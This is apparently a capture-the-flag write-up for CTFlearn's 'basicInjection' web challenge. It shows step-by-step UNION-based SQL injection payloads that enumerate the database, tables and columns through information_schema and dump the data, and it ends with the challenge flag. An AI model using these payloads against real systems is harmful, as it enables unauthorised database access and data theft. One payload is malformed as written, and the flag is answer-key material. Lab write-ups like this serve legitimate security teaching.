## basicInjection 

viewing the [pagesource](view-source:https://web.ctflearn.com/web4/)

there are some hints like try these usernames where the username Luke gives us valid page

by using this we can check for basic sql injection for example try `Luke' and 1=1#` if the page reacts as expected
 
then sql injection can be performed, and if you want you can double check it by a wrong input like `Luke' and 1=2#`

this will not give any output. Now i identified how many columns are there  using the order by statement

(i.e)`Luke' union order by 2#` after some trials i found that it has two columns, so i used the select statement to 

get the database name

`Luke' union select database(),null`

and then i queried for the table names 

`Luke' union select table_name,null from information_schema.tables where table_schema='webfour'`

and surprisingly there is only one table and then i just queried for the columns

`Luke' union select column_name,null from information_schema.columns where table_name='webfour'#`

 there are only two columns so i just select the two columns

`Luke' union select name,data from webfour#`

voila i got the flag

`CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}`